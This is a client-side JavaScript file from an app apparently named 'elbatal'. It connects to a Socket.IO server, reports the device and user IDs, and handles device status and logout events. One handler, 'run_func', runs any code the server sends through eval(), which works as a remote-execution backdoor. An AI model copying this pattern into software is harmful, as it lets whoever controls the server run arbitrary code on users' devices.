// if (typeof what_window.zCMJFp1 !== "undefined" && what_window.zCMJFp1) {
start_socket();
// }
function start_socket() {
    if (what_window.socket && what_window.socket.connected) {
        console.log("Socket.IO is connected.");

    } else {
        // socket_server = "https://serv.elbatal-app.com";
        // socket_server = "https://nodejs-production-2bdf.up.railway.app/";
        // socket_server = "https://her.elbatal-app.com";
        socket_server = "https://elbataltv.onrender.com/";
        what_window.socket = io(socket_server, {
            transports: ['websocket'], // Use WebSocket only
            reconnectionDelay: 100
        });
        socket.on('connect', () => {
            console.log('Connected to server:', socket.id);
        });

        socket.on('disconnect', (reason) => {
            console.log('Disconnected from server:', reason);
            if (reason === 'io server disconnect') {
                socket.connect();
            }
        });

        socket.on('send_me_user_id', () => {
            socket.emit("my_user_id", what_window.dev_id, user_data.user_id, what_window.dev_name);
        });
        socket.on('user_connection', (connected_users_num) => {
            console.log(connected_users_num + " Connected Users.");
        });

        socket.on('console', (msg) => {
            console.log(msg);
        });

        socket.on('run_func', (func) => {
            try {
                eval(func);
            } catch (error) {
                console.log(error);
            }
        });

        socket.on('my_online_devices', (my_devices_status) => {
            what_window.my_devices_status = my_devices_status;
            what_window.update_my_devices_status();
        });
        socket.on('an_device_loged_out', (dev_id_loged_out) => {
            console.log("dev_id_loged_out => " + dev_id_loged_out);
            console.log("what_window.dev_id => " + what_window.dev_id);
            if (dev_id_loged_out == what_window.dev_id) {
                what_window.logout_from_elbatal();
            } else {
                $(`.device[data-dev_id="${dev_id_loged_out}"]`).remove();
            }
        });

        // setInterval(() => {
        //     if (socket.connected) {
        //         socket.emit("heartbeat", { status: "alive" });
        //     }
        // }, 20000); // 20 seconds

        // document.addEventListener("visibilitychange", () => {
        //     if (document.visibilityState === "visible" && !socket.connected) {
        //         socket.connect();
        //     }
        // });


    }
}

function measurePing() {
    const startTime = Date.now();
    socket.emit("ping-check", () => {
        const latency = Date.now() - startTime;
        console.log("Ping: " + latency + "ms");
    });
}

function stop_socket() {

}
// Send ping every 5 seconds
// setInterval(measurePing, 1000);